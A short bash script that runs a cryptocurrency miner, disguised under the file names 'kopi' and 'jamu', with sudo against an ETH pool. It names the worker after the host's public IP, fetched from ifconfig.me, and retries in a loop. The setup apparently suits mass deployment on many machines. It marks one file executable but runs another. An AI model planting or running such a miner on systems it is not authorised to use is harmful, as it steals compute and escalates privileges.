#!/bin/bash


chmod +x ./jamu && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot.$(echo "$(curl -s ifconfig.me)" | tr . _ )
while [ $? -eq 42 ]; do
    sleep 10s
    chmod +x ./jamu && sudo ./kopi --coin ETH --pool ethash.poolbinance.com:1800 --user Jarot.$(echo "$(curl -s ifconfig.me)" | tr . _ )
done
